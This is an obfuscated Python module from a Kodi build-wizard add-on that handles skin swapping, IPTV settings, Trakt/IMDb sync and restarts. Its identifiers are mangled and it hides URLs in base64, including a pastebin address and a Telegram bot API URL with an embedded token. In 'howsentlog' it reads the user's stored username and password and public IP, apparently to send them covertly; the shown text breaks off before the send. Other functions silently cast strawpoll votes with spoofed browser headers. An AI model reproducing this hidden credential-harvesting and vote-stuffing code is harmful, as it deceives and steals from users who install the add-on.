# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
KEEPHUBSPORT =wiz .getS ('keephubsport')#line:147
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPWEATHER =wiz .getS ('keepweather')#line:151
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
IPTVSIMPL18 =uservar .IPTVSIMPL18 #line:219
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:220
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:221
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:222
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:223
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:224
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:225
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:226
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:227
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:228
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:229
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:230
LOGFILES =wiz .LOGFILES #line:231
TRAKTID =traktit .TRAKTID #line:232
DEBRIDID =debridit .DEBRIDID #line:233
LOGINID =loginit .LOGINID #line:234
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:235
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:236
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:237
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:238
fullsecfold =xbmc .translatePath ('special://home')#line:239
addons_folder =os .path .join (fullsecfold ,'addons')#line:241
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:243
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:245
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:247
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:248
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:249
def MainMenu ():#line:256
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:258
def skinWIN ():#line:259
	idle ()#line:260
	OO0O0OOOOO0OOOOO0 =glob .glob (os .path .join (ADDONS ,'skin*'))#line:261
	OO0O0OO000OOOO0O0 =[];OOOOO0OO0000OO0O0 =[]#line:262
	for O0O0OO0OOO0OOOOO0 in sorted (OO0O0OOOOO0OOOOO0 ,key =lambda O0O00O00OOOOO0OO0 :O0O00O00OOOOO0OO0 ):#line:263
		OO0000O0OOOO0OOO0 =os .path .split (O0O0OO0OOO0OOOOO0 [:-1 ])[1 ]#line:264
		O0OO0O0O00O0O00O0 =os .path .join (O0O0OO0OOO0OOOOO0 ,'addon.xml')#line:265
		if os .path .exists (O0OO0O0O00O0O00O0 ):#line:266
			OOO0OO0O000OOO0O0 =open (O0OO0O0O00O0O00O0 )#line:267
			O00O0OOOO0O000OO0 =OOO0OO0O000OOO0O0 .read ()#line:268
			OO0O0OO00000O0000 =parseDOM2 (O00O0OOOO0O000OO0 ,'addon',ret ='id')#line:269
			OOO0OOOO0000O00OO =OO0000O0OOOO0OOO0 if len (OO0O0OO00000O0000 )==0 else OO0O0OO00000O0000 [0 ]#line:270
			try :#line:271
				OO0O0OO0OO0OO0O00 =xbmcaddon .Addon (id =OOO0OOOO0000O00OO )#line:272
				OO0O0OO000OOOO0O0 .append (OO0O0OO0OO0OO0O00 .getAddonInfo ('name'))#line:273
				OOOOO0OO0000OO0O0 .append (OOO0OOOO0000O00OO )#line:274
			except :#line:275
				pass #line:276
	OO0O000OO000OOO0O =[];O0O00OO0O0O00OOOO =0 #line:277
	OOOOO0OOOO0OO00O0 =["Current Skin -- %s"%currSkin ()]+OO0O0OO000OOOO0O0 #line:278
	O0O00OO0O0O00OOOO =DIALOG .select ("Select the Skin you want to swap with.",OOOOO0OOOO0OO00O0 )#line:279
	if O0O00OO0O0O00OOOO ==-1 :return #line:280
	else :#line:281
		OOOOOO0000OO000OO =(O0O00OO0O0O00OOOO -1 )#line:282
		OO0O000OO000OOO0O .append (OOOOOO0000OO000OO )#line:283
		OOOOO0OOOO0OO00O0 [O0O00OO0O0O00OOOO ]="%s"%(OO0O0OO000OOOO0O0 [OOOOOO0000OO000OO ])#line:284
	if OO0O000OO000OOO0O ==None :return #line:285
	for OO00O0O00OO0O000O in OO0O000OO000OOO0O :#line:286
		swapSkins (OOOOO0OO0000OO0O0 [OO00O0O00OO0O000O ])#line:287
def currSkin ():#line:289
	return xbmc .getSkinDir ('Container.PluginName')#line:290
def swapSkins (O000OOO0OOO000OOO ,title ="Error"):#line:291
	OO0O0OO0000000000 ='lookandfeel.skin'#line:292
	OOOOOOOO0OO0OOO0O =O000OOO0OOO000OOO #line:293
	OOOOOOOO000OOOO00 =getOld (OO0O0OO0000000000 )#line:294
	O000OOO00OO00O0OO =OO0O0OO0000000000 #line:295
	setNew (O000OOO00OO00O0OO ,OOOOOOOO0OO0OOO0O )#line:296
	O000O000O000O0OOO =0 #line:297
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O000O000O000O0OOO <100 :#line:298
		O000O000O000O0OOO +=1 #line:299
		xbmc .sleep (1 )#line:300
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:301
		xbmc .executebuiltin ('SendClick(11)')#line:302
	return True #line:303
def getOld (OO0OOO0O00O0OOO00 ):#line:305
	try :#line:306
		OO0OOO0O00O0OOO00 ='"%s"'%OO0OOO0O00O0OOO00 #line:307
		O0O0OOO0OO0OOOOOO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(OO0OOO0O00O0OOO00 )#line:308
		O0000O00O0OOO0000 =xbmc .executeJSONRPC (O0O0OOO0OO0OOOOOO )#line:310
		O0000O00O0OOO0000 =simplejson .loads (O0000O00O0OOO0000 )#line:311
		if O0000O00O0OOO0000 .has_key ('result'):#line:312
			if O0000O00O0OOO0000 ['result'].has_key ('value'):#line:313
				return O0000O00O0OOO0000 ['result']['value']#line:314
	except :#line:315
		pass #line:316
	return None #line:317
def setNew (O00O000OO0O00O0OO ,O00OO00OOO000OO00 ):#line:320
	try :#line:321
		O00O000OO0O00O0OO ='"%s"'%O00O000OO0O00O0OO #line:322
		O00OO00OOO000OO00 ='"%s"'%O00OO00OOO000OO00 #line:323
		O0O0OOO000OOOOO0O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O00O000OO0O00O0OO ,O00OO00OOO000OO00 )#line:324
		OOO00O00OO0OO00OO =xbmc .executeJSONRPC (O0O0OOO000OOOOO0O )#line:326
	except :#line:327
		pass #line:328
	return None #line:329
def idle ():#line:330
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:331
def resetkodi ():#line:333
		if xbmc .getCondVisibility ('system.platform.windows'):#line:334
			OOO00OO00OO0OOOOO =xbmcgui .DialogProgress ()#line:335
			OOO00OO00OO0OOOOO .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:338
			OOO00OO00OO0OOOOO .update (0 )#line:339
			for O0OOO0O000OO000OO in range (5 ,-1 ,-1 ):#line:340
				time .sleep (1 )#line:341
				OOO00OO00OO0OOOOO .update (int ((5 -O0OOO0O000OO000OO )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (O0OOO0O000OO000OO ),'')#line:342
				if OOO00OO00OO0OOOOO .iscanceled ():#line:343
					from resources .libs import win #line:344
					return None ,None #line:345
			from resources .libs import win #line:346
		else :#line:347
			OOO00OO00OO0OOOOO =xbmcgui .DialogProgress ()#line:348
			OOO00OO00OO0OOOOO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:351
			OOO00OO00OO0OOOOO .update (0 )#line:352
			for O0OOO0O000OO000OO in range (5 ,-1 ,-1 ):#line:353
				time .sleep (1 )#line:354
				OOO00OO00OO0OOOOO .update (int ((5 -O0OOO0O000OO000OO )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (O0OOO0O000OO000OO ),'')#line:355
				if OOO00OO00OO0OOOOO .iscanceled ():#line:356
					os ._exit (1 )#line:357
					return None ,None #line:358
			os ._exit (1 )#line:359
def backtokodi ():#line:361
			wiz .kodi17Fix ()#line:362
			fix18update ()#line:363
			fix17update ()#line:364
def testcommand1 ():#line:366
    import requests #line:367
    OO0OO00O000OOO000 ='18773068'#line:368
    O000O0O0O0OO0O0O0 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO0OO00O000OOO000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:380
    OOOO0OOOOO00O0O00 ='145273320'#line:382
    O0000O000OOO00OOO ='145272688'#line:383
    if ADDON .getSetting ("auto_rd")=='true':#line:384
        OO0OOO00OOO000OO0 =OOOO0OOOOO00O0O00 #line:385
    else :#line:386
        OO0OOO00OOO000OO0 =O0000O000OOO00OOO #line:387
    OOOOOOOOO0OOOOO0O ={'options':OO0OOO00OOO000OO0 }#line:391
    O00OOO0OOO00OOO00 =requests .post ('https://www.strawpoll.me/'+OO0OO00O000OOO000 ,headers =O000O0O0O0OO0O0O0 ,data =OOOOOOOOO0OOOOO0O )#line:393
def builde_Votes ():#line:394
   try :#line:395
        import requests #line:396
        OO000O0O00O00OO00 ='18773068'#line:397
        OO000OOOOOO0OO0OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OO000O0O00O00OO00 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:409
        O000OOOOOO00OO000 ='145273320'#line:411
        OOOOO00OO000O000O ={'options':O000OOOOOO00OO000 }#line:417
        OOO0OO000OO00OO0O =requests .post ('https://www.strawpoll.me/'+OO000O0O00O00OO00 ,headers =OO000OOOOOO0OO0OO ,data =OOOOO00OO000O000O )#line:419
   except :pass #line:420
def update_Votes ():#line:421
   try :#line:422
        import requests #line:423
        OOO0O0OO0OO000000 ='18773068'#line:424
        OO000OOOOO000O000 ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+OOO0O0OO0OO000000 ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:436
        OO00O0O0OOOOO0O00 ='145273321'#line:438
        OOOOO0O0OO00000OO ={'options':OO00O0O0OOOOO0O00 }#line:444
        O0OO0O000OO000OOO =requests .post ('https://www.strawpoll.me/'+OOO0O0OO0OO000000 ,headers =OO000OOOOO000O000 ,data =OOOOO0O0OO00000OO )#line:446
   except :pass #line:447
def testcommand ():#line:451
    setautorealdebrid ()#line:452
def skin_homeselect ():#line:453
	try :#line:455
		O0O0O00O0OO0O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:456
		O0O0000OOOOO00O00 =open (O0O0O00O0OO0O0O00 ,'r')#line:458
		OOO0O0O0OOOOO0OOO =O0O0000OOOOO00O00 .read ()#line:459
		O0O0000OOOOO00O00 .close ()#line:460
		O000O0O0O00OO00OO ='<setting id="HomeS" type="string(.+?)/setting>'#line:461
		OO0O000O0O0O0OOO0 =re .compile (O000O0O0O00OO00OO ).findall (OOO0O0O0OOOOO0OOO )[0 ]#line:462
		O0O0000OOOOO00O00 =open (O0O0O00O0OO0O0O00 ,'w')#line:463
		O0O0000OOOOO00O00 .write (OOO0O0O0OOOOO0OOO .replace ('<setting id="HomeS" type="string%s/setting>'%OO0O000O0O0O0OOO0 ,'<setting id="HomeS" type="string"></setting>'))#line:464
		O0O0000OOOOO00O00 .close ()#line:465
	except :#line:466
		pass #line:467
def autotrakt ():#line:470
    O0O0OOOOOOOO0O00O =(ADDON .getSetting ("auto_trk"))#line:471
    if O0O0OOOOOOOO0O00O =='true':#line:472
       from resources .libs import trk_aut #line:473
def traktsync ():#line:475
     OOOO000O0O000OO0O =(ADDON .getSetting ("auto_trk"))#line:476
     if OOOO000O0O000OO0O =='true':#line:477
       from resources .libs import trk_aut #line:480
     else :#line:481
        ADDON .openSettings ()#line:482
def imdb_synck ():#line:484
   try :#line:485
     OOO00O00O0000OO00 =xbmcaddon .Addon ('plugin.video.exodusredux')#line:486
     O0OO0OO00O0OOOOO0 =xbmcaddon .Addon ('plugin.video.gaia')#line:487
     OOO0O0OOO00O0OO0O =(ADDON .getSetting ("imdb_sync"))#line:488
     O0O00O000OO00O000 ="imdb.user"#line:489
     OOOO0O0OOO00OO0O0 ="accounts.informants.imdb.user"#line:490
     OOO00O00O0000OO00 .setSetting (O0O00O000OO00O000 ,str (OOO0O0OOO00O0OO0O ))#line:491
     O0OO0OO00O0OOOOO0 .setSetting ('accounts.informants.imdb.enabled','true')#line:492
     O0OO0OO00O0OOOOO0 .setSetting (OOOO0O0OOO00OO0O0 ,str (OOO0O0OOO00O0OO0O ))#line:493
   except :pass #line:494
def dis_or_enable_addon (O00O0000O0OO00O0O ,O00O0O0OO000OO00O ,enable ="true"):#line:496
    import json #line:497
    O000OOO00OOO0000O ='"%s"'%O00O0000O0OO00O0O #line:498
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O00O0000O0OO00O0O )and enable =="true":#line:499
        logging .warning ('already Enabled')#line:500
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O00O0000O0OO00O0O )#line:501
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O00O0000O0OO00O0O )and enable =="false":#line:502
        return xbmc .log ("### Skipped %s, reason = not installed"%O00O0000O0OO00O0O )#line:503
    else :#line:504
        O0O0O000OOO0O0O0O ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O000OOO00OOO0000O ,enable )#line:505
        OO0O0OOOOO0OO00OO =xbmc .executeJSONRPC (O0O0O000OOO0O0O0O )#line:506
        O0000O0O0O0OOO000 =json .loads (OO0O0OOOOO0OO00OO )#line:507
        if enable =="true":#line:508
            xbmc .log ("### Enabled %s, response = %s"%(O00O0000O0OO00O0O ,O0000O0O0O0OOO000 ))#line:509
        else :#line:510
            xbmc .log ("### Disabled %s, response = %s"%(O00O0000O0OO00O0O ,O0000O0O0O0OOO000 ))#line:511
    if O00O0O0OO000OO00O =='auto':#line:512
     return True #line:513
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:514
def iptvset ():#line:517
  try :#line:518
    O0OOO0OOO0O0O00O0 =(ADDON .getSetting ("iptv_on"))#line:519
    if O0OOO0OOO0O0O00O0 =='true':#line:521
       if KODIV >=17 and KODIV <18 :#line:523
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:524
         O00O000O0O00OOO00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:525
         O0OOO0OO00OO0O0OO =(ADDON .getSetting ("iptvUrl"))#line:527
         O00O000O0O00OOO00 .setSetting ('m3uUrl',O0OOO0OO00OO0O0OO )#line:528
         OO000000OOOO0OOO0 =(ADDON .getSetting ("epg_Url"))#line:529
         O00O000O0O00OOO00 .setSetting ('epgUrl',OO000000OOOO0OOO0 )#line:530
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:533
         iptvsimpldownpc ()#line:534
         wiz .kodi17Fix ()#line:535
         xbmc .sleep (1000 )#line:536
         O00O000O0O00OOO00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:537
         O0OOO0OO00OO0O0OO =(ADDON .getSetting ("iptvUrl"))#line:538
         O00O000O0O00OOO00 .setSetting ('m3uUrl',O0OOO0OO00OO0O0OO )#line:539
         OO000000OOOO0OOO0 =(ADDON .getSetting ("epg_Url"))#line:540
         O00O000O0O00OOO00 .setSetting ('epgUrl',OO000000OOOO0OOO0 )#line:541
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:543
         iptvsimpldown ()#line:544
         wiz .kodi17Fix ()#line:545
         xbmc .sleep (1000 )#line:546
         O00O000O0O00OOO00 =xbmcaddon .Addon ('pvr.iptvsimple')#line:547
         O0OOO0OO00OO0O0OO =(ADDON .getSetting ("iptvUrl"))#line:548
         O00O000O0O00OOO00 .setSetting ('m3uUrl',O0OOO0OO00OO0O0OO )#line:549
         OO000000OOOO0OOO0 =(ADDON .getSetting ("epg_Url"))#line:550
         O00O000O0O00OOO00 .setSetting ('epgUrl',OO000000OOOO0OOO0 )#line:551
  except :pass #line:552
def howsentlog ():#line:559
       try :#line:560
          import json #line:561
          O000OO00OO00OO0OO =(ADDON .getSetting ("user"))#line:562
          O00O0O00OO0O00O00 =(ADDON .getSetting ("pass"))#line:563
          O0OOO00O00OOOO000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:564
          O000OO0O00O0OO0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:566
          OO00O0OO0000O0000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:567
          OOOO0OOOOOOOO00O0 =str (json .loads (OO00O0OO0000O0000 )['ip'])#line:568
          OO0OO0O00O00OO0OO =O000OO00OO00OO0OO #line:569
          OO000O0OOOO000000 =O00O0O00OO0O00O00 #line:570
          import socket #line:572
